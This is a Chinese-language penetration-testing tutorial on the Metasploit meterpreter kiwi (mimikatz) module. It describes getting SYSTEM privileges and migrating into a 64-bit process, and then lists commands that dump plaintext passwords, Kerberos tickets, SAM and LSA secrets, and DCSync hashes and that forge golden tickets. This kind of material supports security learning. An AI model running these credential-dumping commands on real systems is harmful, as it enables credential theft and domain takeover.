## 一、简介

```php
	MSF中的mimikatz模块，可以列举出系统的各种凭证，以及执行一些mimikatz相关的命令。目前，该模块已更新位功能更全的kiwi模块。
```



## 二、条件

### 1、system权限

```php
# system
	meterpreter > getuid
```

![image-20220602214154610](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220602214154610.png)

### 2、进程迁移

```php
# 解释
	kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统。如果目标系统是64位的，则必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载kiwi并且查看系统明文。
```

```php
# 1、查看系统
	meterpreter > sysinfo
```

![image-20220602214111002](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220602214111002.png)

```php
# 2、查看进程
	meterpreter > ps
```

![image-20220602214239502](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220602214239502.png)

```php
# 3、进程迁移
	meterpreter > migrate 472
```

![image-20220602214259075](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220602214259075.png)



## 三、用法

### 1、加载kiwi模块

```
	meterpreter > load kiwi
```

![image-20220602214809430](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220602214809430.png)

### 2、查看kiwi模块的使用

```php
	meterpreter > help kiwi
```

![image-20220602214841068](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220602214841068.png)

### 3、常用命令

```php
# creds_all	列举系统中的明文密码
```

![image-20220602215929777](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220602215929777.png)

```php
# kiwi_cmd	该模块可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令
	kiwi_cmd sekurlsa::logonpasswords	列举系统中的明文密码
```

![image-20220602215929777](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220602215929777.png)

### 4、其他命令

```php
	creds_all：列举所有凭据
	creds_kerberos：列举所有kerberos凭据
	creds_msv：列举所有msv凭据
	creds_ssp：列举所有ssp凭据
	creds_tspkg：列举所有tspkg凭据
	creds_wdigest：列举所有wdigest凭据
	dcsync：通过DCSync检索用户帐户信息
	dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID
	golden_ticket_create：创建黄金票据
	kerberos_ticket_list：列举kerberos票据
	kerberos_ticket_purge：清除kerberos票据
	kerberos_ticket_use：使用kerberos票据
	kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令
	lsa_dump_sam：dump出lsa的SAM
	lsa_dump_secrets：dump出lsa的密文
	password_change：修改密码
	wifi_list：列出当前用户的wifi配置文件
	wifi_list_shared：列出共享wifi配置文件/编码
```